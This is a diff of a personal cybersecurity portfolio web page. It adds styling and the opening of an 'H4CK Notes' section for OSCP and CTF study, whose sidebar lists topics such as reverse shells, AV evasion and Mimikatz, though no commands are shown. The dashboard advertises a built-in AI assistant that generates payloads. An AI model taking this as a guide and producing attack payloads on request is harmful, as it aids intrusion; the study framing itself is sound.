+.n-page-sub { color:#445070; font-size:11px; margin-bottom:24px; letter-spacing:1px; display:flex; align-items:center; gap:8px; }
+.n-page-sub::before { content:'//'; color:#7c3aff; }
+
+.n-card-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(290px,1fr)); gap:14px; margin-bottom:24px; }
+.n-card { background:#111624; border:1px solid #1a2240; border-radius:8px; padding:18px; cursor:pointer; transition:all 0.2s; position:relative; overflow:hidden; }
+.n-card::before { content:''; position:absolute; inset:0; background:linear-gradient(135deg,rgba(124,58,255,0.35) 0%,transparent 60%); opacity:0; transition:opacity 0.2s; }
+.n-card:hover { border-color:#7c3aff; transform:translateY(-2px); box-shadow:0 8px 30px rgba(0,0,0,0.4); }
+.n-card:hover::before { opacity:1; }
+.n-card-title { font-family:'Space Grotesk',sans-serif; font-weight:700; font-size:13px; color:#00e5ff; margin-bottom:8px; display:flex; align-items:center; gap:8px; position:relative; }
+.n-card-body { color:#b8c8e8; font-size:11px; line-height:1.6; position:relative; }
+
+.n-code-block { background:#050710; border:1px solid #1a2240; border-radius:8px; margin:10px 0; overflow:hidden; box-shadow:0 4px 20px rgba(0,0,0,0.4); }
+.n-code-header { display:flex; justify-content:space-between; align-items:center; padding:8px 14px; border-bottom:1px solid #1a2240; background:#0d1120; }
+.n-code-dots { display:flex; gap:5px; }
+.n-code-dots span { width:10px; height:10px; border-radius:50%; }
+.n-code-dots .d1{background:#ff5f57} .n-code-dots .d2{background:#ffbd2e} .n-code-dots .d3{background:#28ca41}
+.n-code-lang { font-size:9px; letter-spacing:2px; text-transform:uppercase; color:#00e5ff; margin-left:8px; }
+.n-code-header-right { display:flex; align-items:center; gap:8px; }
+.n-copy-btn { font-size:9px; letter-spacing:1px; text-transform:uppercase; color:#445070; background:none; border:none; cursor:pointer; font-family:'JetBrains Mono',monospace; padding:3px 8px; border-radius:3px; border:1px solid #1a2240; transition:all 0.15s; }
+.n-copy-btn:hover { color:#7c3aff; border-color:#7c3aff; }
+.n-copy-btn.copied { color:#39ff14; border-color:#39ff14; }
+#n-content pre { padding:14px 18px; overflow-x:auto; font-size:12px; line-height:1.7; color:#b8c8e8; white-space:pre; }
+.n-kw{color:#c792ea} .n-cm{color:#3d5068;font-style:italic} .n-st{color:#c3e88d} .n-nm{color:#f78c6c} .n-fn{color:#82aaff} .n-op{color:#00e5ff}
+
+.n-info-box { border-radius:6px; padding:14px 16px; margin:12px 0; font-size:12px; border-left:3px solid; position:relative; overflow:hidden; }
+.n-info-box.tip { background:rgba(0,229,255,0.06); border-color:#00e5ff; }
+.n-info-box.warn { background:rgba(255,58,110,0.06); border-color:#ff3a6e; }
+.n-info-box.info { background:rgba(124,58,255,0.06); border-color:#7c3aff; }
+.n-info-box.note { background:rgba(255,217,61,0.06); border-color:#ffd93d; }
+.n-info-box strong { font-size:9px; letter-spacing:2px; text-transform:uppercase; display:block; margin-bottom:6px; }
+.n-info-box.tip strong{color:#00e5ff} .n-info-box.warn strong{color:#ff3a6e} .n-info-box.info strong{color:#7c3aff} .n-info-box.note strong{color:#ffd93d}
+
+.n-tbl-wrap { overflow-x:auto; margin:12px 0; border-radius:8px; border:1px solid #1a2240; }
+#n-content table { width:100%; border-collapse:collapse; font-size:12px; }
+#n-content th { background:#0d1120; color:#00e5ff; padding:10px 14px; text-align:left; font-size:9px; letter-spacing:2px; text-transform:uppercase; border-bottom:1px solid #1a2240; }
+#n-content td { padding:9px 14px; border-bottom:1px solid rgba(26,34,64,0.5); color:#b8c8e8; vertical-align:top; }
+#n-content tr:last-child td { border-bottom:none; }
+#n-content tr:hover td { background:rgba(124,58,255,0.04); }
+#n-content td code { background:#0d1120; border:1px solid #1a2240; padding:1px 6px; border-radius:3px; color:#00e5ff; font-size:11px; }
+
+#n-content h2 { font-family:'Space Grotesk',sans-serif; font-size:15px; font-weight:700; color:#e8f0ff; margin:28px 0 12px; padding-bottom:8px; border-bottom:1px solid #1a2240; display:flex; align-items:center; gap:10px; }
+#n-content h2::before { content:'>>'; color:#7c3aff; font-size:11px; font-family:'JetBrains Mono',monospace; }
+#n-content h3 { font-family:'Space Grotesk',sans-serif; font-size:13px; font-weight:600; color:#00e5ff; margin:18px 0 8px; display:flex; align-items:center; gap:6px; }
+#n-content h3::before { content:'▸'; color:#7c3aff; font-size:10px; }
+#n-content p { margin:8px 0; font-size:12px; }
+#n-content ul,#n-content ol { padding-left:22px; margin:8px 0; font-size:12px; }
+#n-content li { margin:3px 0; }
+#n-content li::marker { color:#7c3aff; }
+#n-content strong { color:#e8f0ff; }
+
+/* Hero in notes */
+.n-hero { background:linear-gradient(135deg,rgba(124,58,255,0.08) 0%,rgba(0,229,255,0.04) 100%); border:1px solid #1a2240; border-radius:12px; padding:28px; margin-bottom:24px; position:relative; overflow:hidden; }
+.n-hero::before { content:''; position:absolute; top:-60px; right:-60px; width:200px; height:200px; background:radial-gradient(circle,rgba(124,58,255,0.2) 0%,transparent 70%); }
+.n-hero-eyebrow { font-size:9px; letter-spacing:3px; text-transform:uppercase; color:#445070; margin-bottom:10px; }
+.n-hero-title { font-family:'Orbitron',monospace; font-size:28px; font-weight:900; line-height:1.2; margin-bottom:12px; }
+.n-hero-title .d{color:#7c3aff} .n-hero-title .c{color:#00e5ff} .n-hero-title .h{color:#ff3a6e}
+.n-hero-desc { font-size:12px; color:#b8c8e8; line-height:1.8; max-width:700px; }
+.n-cert-row { display:flex; flex-wrap:wrap; gap:8px; margin-top:16px; }
+.n-cert { font-size:9px; padding:4px 12px; border-radius:12px; letter-spacing:1.5px; text-transform:uppercase; font-weight:700; }
+.n-cert.oscp { background:rgba(255,58,110,0.15); color:#ff3a6e; border:1px solid rgba(255,58,110,0.3); }
+.n-cert.other { background:rgba(124,58,255,0.15); color:#7c3aff; border:1px solid rgba(124,58,255,0.3); }
+.n-cert.active { background:rgba(57,255,20,0.1); color:#39ff14; border:1px solid rgba(57,255,20,0.3); }
+
+.n-stats-row { display:flex; gap:12px; margin:20px 0; flex-wrap:wrap; }
+.n-stat-card { background:#111624; border:1px solid #1a2240; border-radius:8px; padding:14px 20px; text-align:center; flex:1; min-width:80px; }
+.n-stat-num { font-family:'Orbitron',monospace; font-size:22px; font-weight:900; color:#7c3aff; display:block; text-shadow:0 0 15px rgba(124,58,255,0.35); }
+.n-stat-label { font-size:9px; color:#445070; text-transform:uppercase; letter-spacing:2px; }
+
+.n-checklist { list-style:none; padding:0; }
+.n-checklist li { display:flex; align-items:flex-start; gap:10px; padding:7px 0; border-bottom:1px solid rgba(26,34,64,0.5); font-size:12px; transition:background 0.1s; }
+.n-checklist li:last-child { border-bottom:none; }
+.n-checklist li.done-item { opacity:0.5; text-decoration:line-through; }
+.n-chk { width:16px; height:16px; border:1px solid #202a50; border-radius:3px; flex-shrink:0; margin-top:2px; cursor:pointer; display:flex; align-items:center; justify-content:center; font-size:10px; transition:all 0.15s; }
+.n-chk:hover { border-color:#7c3aff; }
+.n-chk.done { background:rgba(124,58,255,0.2); border-color:#7c3aff; color:#7c3aff; }
+
+/* AI Panel inside notes */
+#n-ai-panel { position:fixed; right:0; top:44px; bottom:0; width:380px; background:#090c14; border-left:1px solid #1a2240; display:flex; flex-direction:column; z-index:200; transform:translateX(100%); transition:transform 0.35s cubic-bezier(0.4,0,0.2,1); box-shadow:-8px 0 40px rgba(0,0,0,0.6); }
+#n-ai-panel.open { transform:translateX(0); }
+.n-ai-panel-header { padding:16px 18px; border-bottom:1px solid #1a2240; background:linear-gradient(135deg,#0d1020,#160d28); display:flex; align-items:center; justify-content:space-between; flex-shrink:0; }
+.n-ai-panel-title { font-family:'Orbitron',monospace; font-size:13px; font-weight:700; color:#7c3aff; display:flex; align-items:center; gap:8px; text-shadow:0 0 12px rgba(124,58,255,0.35); }
+.n-ai-model-tag { font-size:9px; letter-spacing:1px; color:#445070; background:#0d1120; border:1px solid #1a2240; padding:2px 7px; border-radius:10px; }
+.n-ai-close { background:none; border:none; color:#445070; cursor:pointer; font-size:16px; padding:4px 8px; border-radius:4px; transition:color 0.15s; }
+.n-ai-close:hover { color:#ff3a6e; }
+.n-ai-messages { flex:1; overflow-y:auto; padding:14px 16px; display:flex; flex-direction:column; gap:12px; }
+.n-ai-msg { max-width:90%; padding:10px 13px; border-radius:8px; font-size:12px; line-height:1.6; animation:n-msgIn 0.2s ease; }
+@keyframes n-msgIn { from{opacity:0;transform:translateY(6px)} to{opacity:1;transform:translateY(0)} }
+.n-ai-msg.bot { background:#111624; border:1px solid #1a2240; border-bottom-left-radius:2px; align-self:flex-start; color:#b8c8e8; }
+.n-ai-msg.user { background:rgba(124,58,255,0.15); border:1px solid rgba(124,58,255,0.3); border-bottom-right-radius:2px; align-self:flex-end; color:#e8f0ff; }
+.n-ai-msg-label { font-size:9px; letter-spacing:2px; text-transform:uppercase; color:#445070; margin-bottom:4px; }
+.n-ai-msg.bot .n-ai-msg-label { color:#7c3aff; }
+.n-ai-msg.user .n-ai-msg-label { color:#00e5ff; text-align:right; }
+.n-ai-msg code { background:#0d1120; padding:1px 5px; border-radius:3px; color:#00e5ff; font-size:11px; }
+.n-ai-thinking { display:flex; gap:4px; padding:4px 0; }
+.n-ai-thinking span { width:6px; height:6px; border-radius:50%; background:#7c3aff; animation:n-bounce 1s ease-in-out infinite; }
+.n-ai-thinking span:nth-child(2){animation-delay:0.15s} .n-ai-thinking span:nth-child(3){animation-delay:0.3s}
+@keyframes n-bounce { 0%,80%,100%{transform:scale(0.6)} 40%{transform:scale(1)} }
+.n-ai-quick-prompts { padding:10px 16px; border-top:1px solid #1a2240; display:flex; flex-wrap:wrap; gap:6px; flex-shrink:0; }
+.n-quick-btn { font-size:10px; padding:4px 10px; background:#0d1120; border:1px solid #1a2240; border-radius:12px; cursor:pointer; color:#445070; transition:all 0.15s; font-family:'JetBrains Mono',monospace; }
+.n-quick-btn:hover { color:#00e5ff; border-color:#00e5ff; background:rgba(0,229,255,0.06); }
+.n-ai-input-row { padding:12px 14px; border-top:1px solid #1a2240; display:flex; gap:8px; align-items:flex-end; flex-shrink:0; }
+.n-ai-input-row textarea { flex:1; background:#0d1120; border:1px solid #1a2240; border-radius:8px; padding:9px 12px; color:#b8c8e8; font-family:'JetBrains Mono',monospace; font-size:12px; resize:none; outline:none; line-height:1.5; min-height:40px; max-height:120px; transition:border-color 0.2s; }
+.n-ai-input-row textarea:focus { border-color:#7c3aff; }
+.n-ai-input-row textarea::placeholder { color:#445070; }
+.n-ai-send { background:linear-gradient(135deg,#7c3aff,#5b21b6); border:none; border-radius:8px; width:38px; height:38px; color:white; cursor:pointer; font-size:16px; display:flex; align-items:center; justify-content:center; transition:all 0.2s; flex-shrink:0; box-shadow:0 0 15px rgba(124,58,255,0.35); }
+.n-ai-send:hover { transform:scale(1.05); box-shadow:0 0 25px rgba(124,58,255,0.35); }
+.n-ai-send:disabled { opacity:0.5; cursor:not-allowed; transform:none; }
+
+#n-ai-toggle { position:fixed; right:20px; bottom:20px; width:52px; height:52px; background:linear-gradient(135deg,#7c3aff,#5b21b6); border:none; border-radius:50%; color:white; cursor:pointer; font-size:20px; display:none; align-items:center; justify-content:center; z-index:201; box-shadow:0 0 25px rgba(124,58,255,0.35),0 4px 20px rgba(0,0,0,0.5); transition:all 0.2s; animation:n-ai-pulse 3s ease-in-out infinite; }
+#page-notes.active #n-ai-toggle { display:flex; }
+@keyframes n-ai-pulse { 0%,100%{box-shadow:0 0 25px rgba(124,58,255,0.35),0 4px 20px rgba(0,0,0,0.5)} 50%{box-shadow:0 0 45px rgba(124,58,255,0.35),0 4px 20px rgba(0,0,0,0.5)} }
+#n-ai-toggle:hover { transform:scale(1.1); }
+.n-ai-toggle-badge { position:absolute; top:-3px; right:-3px; background:#ff3a6e; color:white; font-size:8px; padding:2px 5px; border-radius:8px; font-weight:700; font-family:'JetBrains Mono',monospace; }
+
+#n-menu-toggle { position:fixed; bottom:80px; right:20px; display:none; width:44px; height:44px; background:#111624; border:1px solid #1a2240; border-radius:8px; color:#b8c8e8; cursor:pointer; font-size:18px; align-items:center; justify-content:center; z-index:202; }
+
+/* Copyright watermark */
+.n-copyright-strip { background:linear-gradient(90deg,rgba(124,58,255,0.1),rgba(0,229,255,0.05)); border:1px solid rgba(124,58,255,0.2); border-radius:6px; padding:10px 16px; margin-bottom:20px; display:flex; align-items:center; gap:10px; font-size:10px; color:#445070; letter-spacing:1.5px; text-transform:uppercase; }
+.n-copyright-strip strong { color:#7c3aff; }
+
+@media (max-width:768px) {
+  #n-sidebar { transform:translateX(-100%); transition:transform 0.3s; }
+  #n-sidebar.open { transform:translateX(0); }
+  #n-main { margin-left:0; }
+  #n-menu-toggle { display:flex; }
+  #n-content { padding:16px; }
+  .n-card-grid { grid-template-columns:1fr; }
+  #n-ai-panel { width:100%; }
+}
+
+/* Notes AI tool grid */
+.n-ai-tool-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(260px,1fr)); gap:14px; margin:16px 0; }
+.n-ai-tool-card { background:#111624; border:1px solid #1a2240; border-radius:10px; padding:20px; transition:all 0.2s; position:relative; overflow:hidden; }
+.n-ai-tool-card:hover { border-color:#7c3aff; transform:translateY(-2px); }
+.n-ai-tool-card::before { content:''; position:absolute; top:0; left:0; width:100%; height:2px; background:linear-gradient(90deg,#7c3aff,#00e5ff); opacity:0; transition:opacity 0.2s; }
+.n-ai-tool-card:hover::before { opacity:1; }
+.n-ai-tool-icon { font-size:24px; margin-bottom:10px; display:block; }
+.n-ai-tool-name { font-family:'Space Grotesk',sans-serif; font-weight:700; font-size:13px; color:#e8f0ff; margin-bottom:6px; }
+.n-ai-tool-desc { font-size:11px; color:#b8c8e8; line-height:1.6; }
+.n-ai-tool-tags { display:flex; gap:5px; flex-wrap:wrap; margin-top:10px; }
+.n-ai-tag { font-size:9px; padding:2px 7px; border-radius:10px; background:rgba(124,58,255,0.15); color:#7c3aff; border:1px solid rgba(124,58,255,0.25); letter-spacing:0.5px; }
+
+/* glow */
+.n-glow-text { text-shadow:0 0 15px currentColor; }
+@keyframes n-blink { 50%{opacity:0} }
+.n-cursor { animation:n-blink 1s step-end infinite; }
 </style>
 </head>
 <body>
+
+<!-- ══════════════════════ TAB NAVIGATION ══════════════════════ -->
+<div id="tab-nav">
+  <span class="tab-logo">RIFDHY<em>.RM</em></span>
+  <button class="tab-btn active" onclick="switchTab('portfolio')">👤 Portfolio</button>
+  <button class="tab-btn notes-tab" onclick="switchTab('notes')">💀 H4CK Notes</button>
+  <div class="tab-sep"></div>
+  <span class="tab-badge">DARCKSHAD4W · OSCP TRACK</span>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════ -->
+<!--                    PAGE 1: PORTFOLIO                          -->
+<!-- ══════════════════════════════════════════════════════════════ -->
+<div id="page-portfolio" class="page active">
 
 <div id="cursor"></div>
 <div id="cursor-ring"></div>
@@ -386,7 +566,6 @@ footer {
 <div class="bg-glow bg-glow-2"></div>
 <div class="bg-glow bg-glow-3"></div>
 
-<!-- NAV -->
 <nav>
   <a href="#hero" class="nav-logo">RIFDHY<em>.RM</em></a>
   <ul class="nav-links">
@@ -397,27 +576,31 @@ footer {
     <li><a href="#education">Education</a></li>
     <li><a href="#contact">Contact</a></li>
   </ul>
-  <div class="nav-status"><div class="status-dot"></div> Available for engagements</div>
+  <div style="display:flex;align-items:center;gap:16px;">
+    <button class="nav-notes-link" onclick="switchTab('notes')">💀 H4CK Notes</button>
+    <div class="nav-status"><div class="status-dot"></div> Available for engagements</div>
+  </div>
 </nav>
 
-<!-- HERO -->
 <section id="hero">
   <div class="hero-inner">
     <div>
       <div class="hero-eyebrow"><span>// </span>Colombo, Sri Lanka</div>
       <h1 class="hero-name">RIFDHY<span class="line2">RM</span></h1>
       <div class="hero-title">Cybersecurity Professional & Red Teamer · eJPT · CEH · CWAP</div>
-      <p class="hero-bio">Offensive security specialist with a deep passion for penetration testing, red teaming, and adversary simulation. Leading Security Operations at Halexo while hunting flags on HackTheBox as <strong style="color:var(--accent)">Darckshad4w.</strong>. Pursuing OSCP & CRTP.</p>
+      <p class="hero-bio">Offensive security specialist with a deep passion for penetration testing, red teaming, and adversary simulation. Leading Security Operations at Halexo while hunting flags on HackTheBox as <strong style="color:var(--accent)">Darckshad4w.</strong> Pursuing OSCP & CRTP.</p>
       <div class="hero-chips">
         <span class="chip a">⚔️ Red Teamer</span>
         <span class="chip r">🔴 Pentester</span>
         <span class="chip g">🚩 HTB: Darckshad4w</span>
         <span class="chip">🎓 MSc Cyber Security</span>
         <span class="chip">📍 Colombo, Sri Lanka</span>
+        <span class="chip p" onclick="switchTab('notes')">💀 H4CK Notes</span>
       </div>
       <div class="hero-cta">
         <a href="#contact" class="btn-primary">Get In Touch</a>
         <a href="https://www.linkedin.com/in/rifdhyrm" target="_blank" class="btn-outline">LinkedIn →</a>
+        <button class="btn-notes" onclick="switchTab('notes')">💀 H4CK Notes</button>
       </div>
     </div>
 
@@ -432,7 +615,7 @@ footer {
           <div class="photo-label-name">Rifdhy RM</div>
           <div class="photo-label-role">// SECURITY OPERATIONS LEAD</div>
         </div>
-        <div class="photo-badge">HALEXO · ACTIVE</div>
+        <div class="photo-badge">SEC OPS LEAD · ACTIVE</div>
       </div>
       <div class="hero-stats">
         <div class="hstat"><div class="hstat-num">4+</div><div class="hstat-label">Yrs Pentest</div></div>
@@ -447,7 +630,6 @@ footer {
 
 <hr class="divider">
 
-<!-- EXPERTISE -->
 <section id="expertise" class="section">
   <div class="sec-label">Core Expertise</div>
   <h2 class="sec-title">What I Do</h2>
@@ -463,7 +645,6 @@ footer {
 
 <hr class="divider">
 
-<!-- SKILLS -->
 <section id="skills" class="section" style="background:var(--bg2);max-width:100%">
   <div style="max-width:1200px;margin:0 auto">
     <div class="sec-label">Technical Arsenal</div>
@@ -520,7 +701,6 @@ footer {
 
 <hr class="divider">
 
-<!-- EXPERIENCE -->
 <section id="experience" class="section">
   <div class="sec-label">Career</div>
   <h2 class="sec-title">Experience</h2>
@@ -528,10 +708,10 @@ footer {
     <div class="tl-col-left">
       <div class="tl-item reveal">
         <div class="tl-dot"></div>
-        <div class="tl-period">JAN 2025 — PRESENT</div>
-        <div class="tl-role">Team Lead — Security Operations</div>
-        <div class="tl-company">HALEXO</div>
-        <div class="tl-desc">Leading cybersecurity initiatives — monitoring security events from multiple heterogeneous network devices, managing Nexpose console, implementing alert filtering, and escalating threats.</div>
+        <div class="tl-period">FEB 2026 — PRESENT</div>
+        <div class="tl-role">Cyber Security Consultant</div>
+        <div class="tl-company">HANRARX · Sri Lanka</div>
+        <div class="tl-desc">Strategic security guidance and technical assessments for clients across multiple sectors.</div>
       </div>
       <div class="tl-item reveal reveal-delay-2">
         <div class="tl-dot"></div>
@@ -551,10 +731,10 @@ footer {
     <div class="tl-col-right">
       <div class="tl-item reveal reveal-delay-1">
         <div class="tl-dot"></div>
-        <div class="tl-period">FEB 2026 — PRESENT</div>
-        <div class="tl-role">Cyber Security Consultant</div>
-        <div class="tl-company">HANRARX · Sri Lanka</div>
-        <div class="tl-desc">Strategic security guidance and technical assessments for clients across multiple sectors.</div>
+        <div class="tl-period">JAN 2025 — PRESENT</div>
+        <div class="tl-role">Team Lead — Security Operations</div>
+        <div class="tl-company">HALEXO</div>
+        <div class="tl-desc">Leading cybersecurity initiatives — monitoring security events from multiple heterogeneous network devices, managing Nexpose console, implementing alert filtering, and escalating threats.</div>
       </div>
       <div class="tl-item reveal reveal-delay-3">
         <div class="tl-dot"></div>
@@ -576,7 +756,6 @@ footer {
 
 <hr class="divider">
 
-<!-- CERTIFICATIONS -->
 <section id="certifications" class="section" style="background:var(--bg2);max-width:100%">
   <div style="max-width:1200px;margin:0 auto">
     <div class="sec-label">Credentials</div>
@@ -597,7 +776,6 @@ footer {
 
 <hr class="divider">
 
-<!-- EDUCATION -->
 <section id="education" class="section">
   <div class="sec-label">Academic Background</div>
   <h2 class="sec-title">Education</h2>
@@ -610,7 +788,6 @@ footer {
 
 <hr class="divider">
 
-<!-- CONTACT -->
 <section id="contact" class="section" style="background:var(--bg2);max-width:100%">
   <div style="max-width:1200px;margin:0 auto">
     <div class="contact-wrapper">
@@ -630,66 +807,1345 @@ footer {
 
 <footer>
   <div class="footer-brand">RIFDHY<em>.RM</em></div>
-  <div class="footer-copy">© 2025 Rifdhy RM · All Rights Reserved</div>
+  <div class="footer-copy">© 2026 Rifdhy RM · All Rights Reserved</div>
   <div class="footer-links">
     <a href="https://www.linkedin.com/in/rifdhyrm" target="_blank">LinkedIn</a>
     <a href="mailto:rifdhyrm@gmail.com">Email</a>
+    <a href="#" onclick="switchTab('notes');return false;">H4CK Notes</a>
   </div>
 </footer>
 
+</div><!-- /page-portfolio -->
+
+<!-- ══════════════════════════════════════════════════════════════ -->
+<!--                  PAGE 2: H4CK NOTES                           -->
+<!-- ══════════════════════════════════════════════════════════════ -->
+<div id="page-notes" class="page">
+
+<aside id="n-sidebar">
+  <div class="n-sidebar-header">
+    <div class="logo-wrap">
+      <span class="n-logo-skull">💀</span>
+      <div class="n-logo-text">
+        <span class="nd">DARK</span><span class="ns">SHAD4W</span><br>
+        <span class="nh">H4CK</span> NOTES
+      </div>
+      <div class="n-logo-tagline">
+        <span class="n-status-dot"></span>
+        OFFENSIVE SECURITY REF
+      </div>
+    </div>
+  </div>
+  <div class="n-search-wrap">
+    <div class="n-search-inner">
+      <input type="text" id="n-search-input" placeholder="Search topics... (Ctrl+K)" oninput="nFilterNav(this.value)">
+    </div>
+  </div>
+  <nav id="n-nav-menu" class="n-nav">
+    <div class="n-nav-section">
+      <div class="n-nav-section-label">Overview</div>
+      <div class="n-nav-item active" onclick="nShowSection('dashboard')">🏠 Dashboard</div>
+      <div class="n-nav-item" onclick="nShowSection('ai-tools')">🤖 AI for Hackers <span class="n-nav-badge new">NEW</span></div>
+    </div>
+    <div class="n-nav-section">
+      <div class="n-nav-section-label">🐧 Linux</div>
+      <div class="n-nav-item" onclick="nShowSection('linux-lateral')">↳ Lateral Movement</div>
+      <div class="n-nav-item" onclick="nShowSection('linux-privesc')">↳ Privilege Escalation 👑</div>
+    </div>
+    <div class="n-nav-section">
+      <div class="n-nav-section-label">🖼️ Windows</div>
+      <div class="n-nav-item" onclick="nShowSection('win-ad')">↳ Active Directory</div>
+      <div class="n-nav-item" onclick="nShowSection('win-lateral')">↳ Lateral Movement</div>
+      <div class="n-nav-item" onclick="nShowSection('win-privesc')">↳ Privilege Escalation 👑</div>
+    </div>
+    <div class="n-nav-section">
+      <div class="n-nav-section-label">⛅ Cloud</div>
+      <div class="n-nav-item" onclick="nShowSection('cloud-aws')">↳ AWS</div>
+      <div class="n-nav-item" onclick="nShowSection('cloud-docker')">↳ Docker</div>
+      <div class="n-nav-item" onclick="nShowSection('cloud-k8s')">↳ Kubernetes</div>
+    </div>
+    <div class="n-nav-section">
+      <div class="n-nav-section-label">⚒️ Tools</div>
+      <div class="n-nav-item" onclick="nShowSection('tools-filetransfer')">↳ File Transfers</div>
+      <div class="n-nav-item" onclick="nShowSection('tools-shells')">↳ Shells / Payloads</div>
+      <div class="n-nav-item" onclick="nShowSection('tools-pivot')">↳ Pivoting / Forwarding</div>
+      <div class="n-nav-item" onclick="nShowSection('tools-enum')">↳ Network Enumeration</div>
+      <div class="n-nav-item" onclick="nShowSection('tools-crack')">↳ Cracking / Fuzzing</div>
+    </div>
+    <div class="n-nav-section">
+      <div class="n-nav-section-label">📟 TCP Ports</div>
+      <div class="n-nav-item" onclick="nShowSection('tcp-21')">↳ FTP | 21</div>
+      <div class="n-nav-item" onclick="nShowSection('tcp-22')">↳ SSH | 22</div>
+      <div class="n-nav-item" onclick="nShowSection('tcp-25')">↳ SMTP | 25</div>
+      <div class="n-nav-item" onclick="nShowSection('tcp-53')">↳ DNS | 53</div>
+      <div class="n-nav-item" onclick="nShowSection('tcp-smb')">↳ SMB | 445</div>
+      <div class="n-nav-item" onclick="nShowSection('tcp-ldap')">↳ LDAP | 389</div>
+    </div>
+    <div class="n-nav-section">
+      <div class="n-nav-section-label">💧 UDP Ports</div>
+      <div class="n-nav-item" onclick="nShowSection('udp-snmp')">↳ SNMP | 161</div>
+      <div class="n-nav-item" onclick="nShowSection('udp-ipmi')">↳ IPMI | 623</div>
+    </div>
+    <div class="n-nav-section">
+      <div class="n-nav-section-label">🪵 OWASP</div>
+      <div class="n-nav-item" onclick="nShowSection('owasp-sqli')">↳ SQL Injection</div>
+      <div class="n-nav-item" onclick="nShowSection('owasp-lfi')">↳ LFI / XXE</div>
+      <div class="n-nav-item" onclick="nShowSection('owasp-xss')">↳ XSS / SSTI</div>
+      <div class="n-nav-item" onclick="nShowSection('owasp-cmd')">↳ Command Injection</div>
+    </div>
+    <div class="n-nav-section">
+      <div class="n-nav-section-label">🎛️ Database</div>
+      <div class="n-nav-item" onclick="nShowSection('db-mssql')">↳ MSSQL / MySQL / PSQL</div>
+    </div>
+    <div class="n-nav-section">
+      <div class="n-nav-section-label">🍎 Red Team</div>
+      <div class="n-nav-item" onclick="nShowSection('other-recon')">↳ Reconnaissance</div>
+      <div class="n-nav-item" onclick="nShowSection('other-av')">↳ AV Evasion</div>
+      <div class="n-nav-item" onclick="nShowSection('other-lolbins')">↳ LOLBins</div>
+    </div>
+    <div class="n-nav-section">
+      <div class="n-nav-section-label">➕ Extra Notes</div>
+      <div class="n-nav-item" onclick="nShowSection('extra-mimikatz')">↳ Mimikatz Cheatsheet <span class="n-nav-badge new">+</span></div>
+      <div class="n-nav-item" onclick="nShowSection('extra-burp')">↳ Burp Suite Pro Tips <span class="n-nav-badge new">+</span></div>
+      <div class="n-nav-item" onclick="nShowSection('extra-oscp')">↳ OSCP Exam Tips <span class="n-nav-badge new">+</span></div>
+      <div class="n-nav-item" onclick="nShowSection('extra-wireless')">↳ Wireless Attacks <span class="n-nav-badge new">+</span></div>
+      <div class="n-nav-item" onclick="nShowSection('extra-report')">↳ Pentest Report Template <span class="n-nav-badge new">+</span></div>
+    </div>
+  </nav>
+  <div class="n-sidebar-footer">
+    <div class="n-prog-row"><span>Study Progress</span><span id="n-prog-pct">0%</span></div>
+    <div class="n-progress-bar"><div class="n-progress-fill" id="n-prog-fill"></div></div>
+    <div class="n-sidebar-credits">© Darckshad4w · All Rights Reserved</div>
+  </div>
+</aside>
+
+<main id="n-main">
+  <div class="n-topbar">
+    <div class="n-breadcrumb">
+      <span style="color:#7c3aff;font-family:'Orbitron',monospace;font-size:10px;">DSH4W</span>
+      <span class="sep">/</span>
+      <span id="n-breadcrumb-label">Dashboard</span>
+    </div>
+    <div class="n-topbar-right">
+      <span class="n-tbadge purple" onclick="nToggleAI()">🤖 AI</span>
+      <span class="n-tbadge cyan">OSCP</span>
+      <span class="n-tbadge red">OffSec</span>
+      <button class="n-tbadge purple" onclick="switchTab('portfolio')" style="cursor:pointer;font-family:'JetBrains Mono',monospace;">← Portfolio</button>
+    </div>
+  </div>
+
+  <div id="n-content">
+
+    <!-- ═══ DASHBOARD ═══ -->
+    <div id="n-sec-dashboard" class="n-section active">
+      <div class="n-copyright-strip">
+        <span>💀</span>
+        <span><strong>© Darckshad4w</strong> — H4CK Notes · Offensive Security Reference · All Rights Reserved</span>
+        <span style="margin-left:auto;color:#7c3aff;">HTB: Darckshad4w.</span>
+      </div>
+      <div class="n-hero">
+        <div class="n-hero-eyebrow">Offensive Security Reference</div>
+        <div class="n-hero-title">
+          <span class="d">DARK</span><span class="c">SHAD4W</span> <span class="h">H4CK</span> NOTES<span class="n-cursor" style="color:#7c3aff">█</span>
+        </div>
+        <div class="n-hero-desc">
+          A comprehensive study reference covering Linux &amp; Windows exploitation, Active Directory attacks, Cloud Security, Web vulnerabilities, and Red Team techniques. Enhanced with <strong style="color:#7c3aff">AI-powered assistance</strong> and expanded extra notes. Built for OSCP/CTF prep.
+        </div>
+        <div class="n-cert-row">
+          <span class="n-cert oscp">OSCP ↔ Pursuing</span>
+          <span class="n-cert active">eJPT ✅</span>
+          <span class="n-cert active">CEH ✅</span>
+          <span class="n-cert active">CWAP ✅</span>
+          <span class="n-cert other">CRTP ↔ Pursuing</span>
+        </div>
+      </div>
+      <div class="n-stats-row">
+        <div class="n-stat-card"><span class="n-stat-num">10</span><span class="n-stat-label">Categories</span></div>
+        <div class="n-stat-card"><span class="n-stat-num">37+</span><span class="n-stat-label">Topics</span></div>
+        <div class="n-stat-card"><span class="n-stat-num">300+</span><span class="n-stat-label">Commands</span></div>
+        <div class="n-stat-card"><span class="n-stat-num">25+</span><span class="n-stat-label">Payloads</span></div>
+        <div class="n-stat-card"><span class="n-stat-num" style="color:#ff3a6e">AI</span><span class="n-stat-label">Powered</span></div>
+      </div>
+      <div class="n-info-box info">
+        <strong>🤖 AI Assistant Active</strong>
+        Click the <strong style="color:#7c3aff">🤖 purple button</strong> (bottom-right) to open the AI assistant. Ask it to explain techniques, generate payloads, decode hashes, or analyze commands — powered by Claude.
+      </div>
+      <h2>Quick Reference Map</h2>
+      <div class="n-card-grid">
+        <div class="n-card" onclick="nShowSection('linux-privesc')"><div class="n-card-title">🐧 Linux PrivEsc</div><div class="n-card-body">SUID binaries, sudo abuse, cron jobs, writable paths, kernel exploits, capabilities</div></div>
+        <div class="n-card" onclick="nShowSection('win-ad')"><div class="n-card-title">🏰 Active Directory</div><div class="n-card-body">Kerberoasting, AS-REP Roasting, Pass-the-Hash, DCSync, BloodHound enum</div></div>
+        <div class="n-card" onclick="nShowSection('tools-shells')"><div class="n-card-title">💀 Shells &amp; Payloads</div><div class="n-card-body">Reverse shells in Bash, Python, PHP, PowerShell, msfvenom one-liners</div></div>
